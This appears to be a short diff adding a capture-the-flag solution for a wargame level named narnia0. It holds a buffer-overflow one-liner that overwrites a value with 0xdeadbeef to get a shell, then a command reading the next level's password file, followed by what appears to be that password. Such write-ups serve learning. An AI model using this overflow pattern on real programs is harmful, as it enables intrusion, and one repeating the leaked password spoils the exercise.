@@ -1,0 +1,7 @@
+(python -c'print "A"*20 + "\xef\xbe\xad\xde"'; cat) | ./narnia0
+
+The command had to be run inside brackets for some reason and cat kept the shell open at the end.
+
+cat /etc/narnia_pass/narnia1
+
+efeidiedae
